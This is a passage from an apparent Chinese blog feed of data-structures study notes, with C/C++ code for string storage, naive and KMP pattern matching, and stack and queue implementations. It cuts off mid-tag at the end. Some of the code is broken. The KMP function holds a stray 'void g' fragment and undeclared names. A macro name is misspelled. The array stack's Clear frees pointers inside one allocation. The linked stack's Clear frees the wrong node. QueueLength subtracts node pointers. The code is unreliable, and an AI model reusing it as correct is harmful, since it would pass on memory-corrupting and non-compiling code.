        <content type="html"><![CDATA[<h3 id="串"><a href="#串" class="headerlink" title="串"></a>串</h3><h4 id="串的定义"><a href="#串的定义" class="headerlink" title="串的定义"></a>串的定义</h4><p>串是由零个或多个字符组成的有限序列，记作：s=”$a_1a_2…a_n$”</p><p>其中，s是串的名，用双引号括起来的字符序列是串的值。</p><p>串长度：串中字符的数目n</p><p>空串：长度为零的串</p><p>子串：串中任意个连续的字符组成的子序列</p><p>主串：包含子串的串相应地称为主串</p><p>串相等：当两个串长度相等，且每个对应位置的字符都相等</p><p>空格串（空白串）：由一个或多个空格组成的串。要和“空串”区别，空格串有长度，就是空格的个数</p><h4 id="串的抽象数据类型的定义"><a href="#串的抽象数据类型的定义" class="headerlink" title="串的抽象数据类型的定义"></a>串的抽象数据类型的定义</h4><p>ADT String{</p><p>​    数据对象：D={$a_i$|$a_i \in$ CharacterSet,i=1,2,..,n, n$\geqslant$0}</p><p>​    数据关系：R={&lt;$a_{i-1}$,$a_i$&gt;|$a_{i-1}$,$a_i\in$D,i=2,3,…,n}</p><p>​    基本操作：</p><p>​        StrAssign(&amp;T,chars)    //根据串常量chars生成串T</p><p>​        DestrString(&amp;S)        //销毁串S</p><p>​        StrCopy(&amp;T,S)    //把串S中内容拷贝到T串</p><p>​        StrLength(S)     //求串长</p><p>​        StrCompare(S,T)  //比较串S和T</p><p>​        Concat(&amp;T,S1,S2)    //连接串</p><p>​        StrEmpty(S)        //判断串是否为空</p><p>​        SubString(&amp;Sub,S,pos,len)    //求子串</p><p>​        ClearString(&amp;S)     //清空串</p><p>​        Index(S,T,pos)    //子串定位</p><p>​        Replace(&amp;S,T,V)   //把串S中符合T的子串替换</p><p>​        StrInsert(&amp;S,pos,T)    //插入子串</p><p>​        StrDelete(&amp;S,pos,len)    //删除子串</p><p>}</p><h4 id="串的表示"><a href="#串的表示" class="headerlink" title="串的表示"></a>串的表示</h4><h5 id="定长顺序存储表示"><a href="#定长顺序存储表示" class="headerlink" title="定长顺序存储表示"></a>定长顺序存储表示</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSTRLEN 255</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> Sstring[MAXSTRLEN+<span class="number">1</span>]</span><br><span class="line">Sstring S;</span><br></pre></td></tr></table></figure><h5 id="堆分配存储表示"><a href="#堆分配存储表示" class="headerlink" title="堆分配存储表示"></a>堆分配存储表示</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="type">char</span> *ch;</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line">&#125;HString;</span><br></pre></td></tr></table></figure><h5 id="串的块链存储表示"><a href="#串的块链存储表示" class="headerlink" title="串的块链存储表示"></a>串的块链存储表示</h5><p>字符串本身是一个线性表，可以用链表存储</p><p>若用普通链表存储，存储密度低，浪费空间严重</p><p>解决办法：一个结点存储多个字符——即串的块链存储</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZZE 80</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Chunk</span>&#123;</span><br><span class="line"><span class="type">char</span> ch[CHUNKSIZE];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Chunk</span> *next;</span><br><span class="line">&#125;Chunk;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">Chunk *head,*tail;</span><br><span class="line"><span class="type">int</span> curlen;</span><br><span class="line">&#125;LString;</span><br></pre></td></tr></table></figure><h4 id="模式匹配简单算法"><a href="#模式匹配简单算法" class="headerlink" title="模式匹配简单算法"></a>模式匹配简单算法</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Index</span><span class="params">(Sstring S,Sstring T,<span class="type">int</span> pos)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    i=pos;</span><br><span class="line">    j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=S[<span class="number">0</span>]&amp;&amp;j&lt;=T[<span class="number">0</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(S[i]==T[j])</span><br><span class="line">        &#123;</span><br><span class="line">            ++i;</span><br><span class="line">            ++j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            i=i-j+<span class="number">2</span>;</span><br><span class="line">            j=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j&gt;T[<span class="number">0</span>]) <span class="keyword">return</span> i-T[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//Index</span></span><br></pre></td></tr></table></figure><p>最好的情况的平均复杂度为$O(n+m)$</p><p>最坏的情况的平均复杂度为$O(n*m)$</p><h4 id="模式匹配KMP算法"><a href="#模式匹配KMP算法" class="headerlink" title="模式匹配KMP算法"></a>模式匹配KMP算法</h4><script type="math/tex; mode=display">next[j]=\begin{cases}max \{k|1<k<j，且t_1...t_{k-1}==t_{j-k+1}...t_{j-1}\} 当此集合非空时\\0 ,当j=1时\\1 其他情况\end{cases}</script><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> next[<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> g</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Index_KMP</span><span class="params">(Sstring S,Sstring T,<span class="type">int</span> pos)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> i,j;</span><br><span class="line">  i=pos;j=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>(i&lt;=S[<span class="number">0</span>]&amp;&amp;j&lt;=T[<span class="number">0</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(j==<span class="number">0</span>||S[i]==T[j])&#123;</span><br><span class="line">    i++;</span><br><span class="line">    j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> j=next[j];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(j&gt;t[<span class="number">0</span>]) <span class="keyword">return</span> i-t[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】 栈和队列</title>
      <link href="/2023/11/23/"/>
      <url>/2023/11/23/</url>
      
        <content type="html"><![CDATA[<h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><h4 id="栈的定义"><a href="#栈的定义" class="headerlink" title="栈的定义"></a>栈的定义</h4><p>栈(Stack)是一种特殊的线性表，其插入和删除操作均在表的一端进行，是一种运算受限的线性表</p><p>栈顶(top)是栈中允许插入和删除的一端</p><p>栈底(bottom)是栈顶的另一端</p><h4 id="栈的抽象数据类型"><a href="#栈的抽象数据类型" class="headerlink" title="栈的抽象数据类型"></a>栈的抽象数据类型</h4><p>ADT Stack{</p><p>​    数据对象：D={$a_i$|$a_i$ $\in$ElemSet ,i=1,2,…,n n$\geqslant$0}</p><p>​    数据关系：R={&lt;$a_{i-1}$,$a_i$&gt;,$a_i \in D$,i=2,…,n}</p><p>​                        约定$a_n$为栈顶，$a_1$为栈底</p><p>​    基本操作：</p><p>​        InitStack(&amp;S)    //初始化栈</p><p>​        DestoryStack(&amp;S)    //销毁栈</p><p>​        ClearStack(&amp;S)    //清空栈</p><p>​        StackEmpty(S)    //判断栈是否为空</p><p>​        StackLength(S)    //求栈长度</p><p>​        GetTop(S,&amp;e)    //取栈顶元素</p><p>​        Push(&amp;S,e)    //入栈</p><p>​        Pop(&amp;S,&amp;e)    //出栈</p><p>​        StackTraverse(S,visit())    //遍历栈</p><p>}ADT Stack</p><h4 id="顺序栈存储结构实现"><a href="#顺序栈存储结构实现" class="headerlink" title="顺序栈存储结构实现"></a>顺序栈存储结构实现</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> SElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    SElemType *base;</span><br><span class="line">    SElemType *top;</span><br><span class="line">    <span class="type">int</span> stacksize;</span><br><span class="line">&#125;SqStack;</span><br></pre></td></tr></table></figure><h4 id="顺序栈的操作实现"><a href="#顺序栈的操作实现" class="headerlink" title="顺序栈的操作实现"></a>顺序栈的操作实现</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACK_INIT_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACKINCREMENT 10</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> SElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    SElemType *base;</span><br><span class="line">    SElemType *top;</span><br><span class="line">    <span class="type">int</span> stacksize;</span><br><span class="line">&#125;SqStack;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitStack</span><span class="params">(SqStack &amp;S)</span></span>&#123;</span><br><span class="line">    S.base=(SElemType*)<span class="built_in">malloc</span>(STACK_INIT_SIZE*<span class="built_in">sizeof</span>(SElemType));</span><br><span class="line">    <span class="keyword">if</span>(!S.base) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    S.top=S.base;</span><br><span class="line">    S.stacksize=STACK_INIT_SIZE;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Init succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(SqStack &amp;S,SElemType e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top-S.base&gt;=S.stacksize)&#123;</span><br><span class="line">        S.base=(SElemType*)<span class="built_in">realloc</span>(S.base, (S.stacksize+STACKINCREMENT)*<span class="built_in">sizeof</span>(SElemType));</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span>(!S.base) &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;ERROR&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    S.top=S.base+S.stacksize;</span><br><span class="line">    S.stacksize+=STACKINCREMENT;</span><br><span class="line">    &#125;</span><br><span class="line">    *S.top++=e;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Push succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">(SqStack &amp;S,SElemType &amp;e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top==S.base)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Stack is Empty.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        e=*(S.top<span class="number">-1</span>);</span><br><span class="line">        S.top--;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Pop succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clear</span><span class="params">(SqStack &amp;S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(S.top&gt;S.base)&#123;</span><br><span class="line">        SElemType* p=S.top;</span><br><span class="line">        S.top--;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        S.stacksize-=STACKINCREMENT;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Stack clear succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestroyStack</span><span class="params">(SqStack &amp;S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (S.base != <span class="literal">NULL</span> )&#123;</span><br><span class="line">        <span class="built_in">Clear</span>(S);</span><br><span class="line">        <span class="built_in">free</span>(S.base);</span><br><span class="line">        S.base = <span class="literal">NULL</span>;</span><br><span class="line">        S.top = <span class="literal">NULL</span>;</span><br><span class="line">        S.stacksize = <span class="number">0</span>;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Stack destroyed.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackEmpty</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.base==S.top) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackLength</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(S.base==S.top)) <span class="keyword">return</span> S.top-S.base;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetTop</span><span class="params">(SqStack S,SElemType &amp;e)</span></span>&#123;</span><br><span class="line">    e=*(S.top<span class="number">-1</span>);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;e is:&quot;</span>&lt;&lt;(&amp;e)&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackTravers</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">StackEmpty</span>(S))</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Stack is Empty.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!(S.top==S.base))&#123;</span><br><span class="line">        S.top--;</span><br><span class="line">        cout&lt;&lt;i&lt;&lt;<span class="string">&quot;. &quot;</span>;</span><br><span class="line">        cout&lt;&lt;(*(&amp;S.top))&lt;&lt;endl;</span><br><span class="line">        <span class="comment">//cout&lt;&lt;(*(&amp;S.top))-&gt;b&lt;&lt;endl;</span></span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    SqStack test;</span><br><span class="line">    SElemType e1;</span><br><span class="line">    e1=<span class="number">1</span>;</span><br><span class="line">    SElemType e2;</span><br><span class="line">    e2=<span class="number">3</span>;</span><br><span class="line">    <span class="built_in">InitStack</span>(test);</span><br><span class="line">    <span class="built_in">Push</span>(test, e1);</span><br><span class="line">    <span class="built_in">Push</span>(test, e2);</span><br><span class="line"> <span class="comment">/*   SElemType inputElem;</span></span><br><span class="line"><span class="comment">    int i=0,n;</span></span><br><span class="line"><span class="comment">    cout&lt;&lt;&quot;input number to input:&quot;;</span></span><br><span class="line"><span class="comment">    cin&gt;&gt;n;</span></span><br><span class="line"><span class="comment">    while (i&lt;n)&#123;</span></span><br><span class="line"><span class="comment">        cout&lt;&lt;&quot;inputElem.a:&quot;;</span></span><br><span class="line"><span class="comment">        cin&gt;&gt;inputElem.a;</span></span><br><span class="line"><span class="comment">        cout&lt;&lt;&quot;inputElem.b:&quot;;</span></span><br><span class="line"><span class="comment">        cin&gt;&gt;inputElem.b;</span></span><br><span class="line"><span class="comment">        i++;</span></span><br><span class="line"><span class="comment">        Push(test, inputElem);</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line">    <span class="built_in">StackTravers</span>(test);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;the Stack&#x27;s length is:&quot;</span>&lt;&lt;<span class="built_in">StackLength</span>(test)&lt;&lt;endl;</span><br><span class="line">    SElemType e;</span><br><span class="line">    <span class="comment">//Pop(test,e);</span></span><br><span class="line">    <span class="comment">//cout&lt;&lt;&quot;Pop out e:&quot;&lt;&lt;e.a&lt;&lt;&quot;-&quot;&lt;&lt;e.b&lt;&lt;endl;</span></span><br><span class="line">    <span class="built_in">GetTop</span>(test,e);</span><br><span class="line">   <span class="comment">// StackTravers(test);</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="链栈的存储实现和操作"><a href="#链栈的存储实现和操作" class="headerlink" title="链栈的存储实现和操作"></a>链栈的存储实现和操作</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> SElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">SNode</span>&#123;</span><br><span class="line">    SElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">SNode</span> *next;</span><br><span class="line">&#125;SNode,*LinkStack;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitStack</span><span class="params">(LinkStack &amp;S)</span></span>&#123;</span><br><span class="line">    S=(SNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(SNode));</span><br><span class="line">    <span class="keyword">if</span>(!S) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    S-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(LinkStack &amp;S,SElemType e)</span></span>&#123;</span><br><span class="line">    SNode* p;</span><br><span class="line">    p=(SNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(SNode));</span><br><span class="line">    p-&gt;data=e;</span><br><span class="line">    p-&gt;next=S-&gt;next;</span><br><span class="line">    S-&gt;next=p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">(LinkStack &amp;S,SElemType &amp;e)</span></span>&#123;</span><br><span class="line">    SNode* p;</span><br><span class="line">    <span class="keyword">if</span>(S-&gt;next==<span class="literal">NULL</span>) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    p=S-&gt;next;</span><br><span class="line">    e=p-&gt;data;</span><br><span class="line">    S-&gt;next=p-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clear</span><span class="params">(LinkStack &amp;S)</span> </span>&#123;</span><br><span class="line">    SNode* p = S-&gt;next; <span class="comment">// 从头结点之后的第一个节点开始</span></span><br><span class="line">    SNode* q;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        q = p-&gt;next; <span class="comment">// 保存下一个节点的引用</span></span><br><span class="line">        <span class="built_in">free</span>(q); <span class="comment">// 释放当前节点</span></span><br><span class="line">        p = q; <span class="comment">// 移动到下一个节点</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    S-&gt;next = <span class="literal">NULL</span>; <span class="comment">// 清空后，将栈的头结点的下一个指针设为 NULL，表示空栈</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestoryStack</span><span class="params">(LinkStack &amp;S)</span></span>&#123;</span><br><span class="line">  <span class="built_in">Clear</span>(S);</span><br><span class="line">    <span class="built_in">free</span>(S);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><h4 id="队列的定义"><a href="#队列的定义" class="headerlink" title="队列的定义"></a>队列的定义</h4><p>队列(Queue)是一种运算受限的特殊线性表，它只允许在表的一段进行插入，而在表的另一段进行删除</p><h4 id="队列抽象数据类型"><a href="#队列抽象数据类型" class="headerlink" title="队列抽象数据类型"></a>队列抽象数据类型</h4><p>ADT Queue{</p><p>​    数据对象：D={$a_i$|$a_i$ $\in$ElemSet ,i=1,2,…,n n$\geqslant$0}</p><p>​    数据关系：R={&lt;$a_{i-1}$,$a_i$&gt;,$a_i \in D$,i=2,…,n}</p><p>​                        约定$a_1$为队列头$a_n$为队列尾</p><p>​    基本操作：</p><p>​        InitQueue(&amp;Q)    //初始化队列</p><p>​        DestoryQueue(&amp;Q)    //销毁队列</p><p>​        ClearQueue(&amp;Q)    //清空队列</p><p>​        QueueEmpty(Q)    //判断队列是否为空</p><p>​        QueueLength(Q)    //求队列长度</p><p>​        GetHead(Q,&amp;e)    //取队列头元素</p><p>​        EnQueue(&amp;Q,e)    //入队列</p><p>​        DeQueue(&amp;Q,&amp;e)    //出队列</p><p>​        QueueTraverse(Q,visit())    //遍历栈</p><p>}ADT Queue</p><h4 id="链队列存储实现"><a href="#链队列存储实现" class="headerlink" title="链队列存储实现"></a>链队列存储实现</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> QElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>  <span class="title class_">QNode</span>&#123;</span><br><span class="line">    QElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">QNode</span> *next;</span><br><span class="line">&#125;QNode,*QueuePtr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    QueuePtr front;</span><br><span class="line">    QueuePtr rear;</span><br><span class="line">&#125;LinkQueue;</span><br></pre></td></tr></table></figure><h4 id="链队列的操作实现"><a href="#链队列的操作实现" class="headerlink" title="链队列的操作实现"></a>链队列的操作实现</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> QElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>  <span class="title class_">QNode</span>&#123;</span><br><span class="line">    QElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">QNode</span> *next;</span><br><span class="line">&#125;QNode,*QueuePtr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    QueuePtr front;</span><br><span class="line">    QueuePtr rear;</span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitQueue</span><span class="params">(LinkQueue &amp;Q)</span></span>&#123;</span><br><span class="line">    Q.front=Q.rear=(QueuePtr)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(QNode));</span><br><span class="line">    <span class="keyword">if</span>(!Q.front)&#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Q.front-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">EnQueue</span><span class="params">(LinkQueue &amp;Q,QElemType e)</span></span>&#123;</span><br><span class="line">    QueuePtr p;</span><br><span class="line">    p=(QueuePtr)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(QNode));</span><br><span class="line">    <span class="keyword">if</span>(!p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;data=e;</span><br><span class="line">    p-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    Q.rear-&gt;next=p;</span><br><span class="line">    Q.rear=p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DeQueue</span><span class="params">(LinkQueue &amp;Q,QElemType &amp;e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;ERROR.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    QueuePtr p;</span><br><span class="line">    p=Q.front-&gt;next;</span><br><span class="line">    e=p-&gt;data;</span><br><span class="line">    Q.front-&gt;next=p-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(Q.rear==p)</span><br><span class="line">    &#123;</span><br><span class="line">        Q.rear=Q.front;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;DeQueue succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">QueueEmpty</span><span class="params">(LinkQueue Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;The Queue is empty.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//队列空</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Element exist.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//队列非空</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">QueueLength</span><span class="params">(LinkQueue Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Q.rear-Q.front;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QueueTravers</span><span class="params">(LinkQueue Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear) &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Empty!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    QueuePtr p = Q.front-&gt;next;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            cout &lt;&lt;i&lt;&lt;<span class="string">&quot;.&quot;</span>&lt;&lt;p-&gt;data&lt;&lt; endl;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ClearQueue</span><span class="params">(LinkQueue &amp;Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (Q.front-&gt;next != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        QueuePtr p = Q.front-&gt;next;</span><br><span class="line">        Q.front-&gt;next = p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">    Q.rear = Q.front;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Clear succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestoryQueue</span><span class="params">(LinkQueue &amp;Q)</span></span>&#123;</span><br><span class="line">    <span class="built_in">ClearQueue</span>(Q);</span><br><span class="line">    <span class="built_in">free</span>(Q.front);</span><br><span class="line">   <span class="comment">// free(Q.rear); 不用再次释放同一地址了</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Destory succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetHead</span><span class="params">(LinkQueue Q,QElemType &amp;e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Q.front-&gt;next != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        QueuePtr p= Q.front-&gt;next;</span><br><span class="line">        e=p-&gt;data;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Empty!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="number">0</span>));</span><br><span class="line">    LinkQueue Q;</span><br><span class="line">    <span 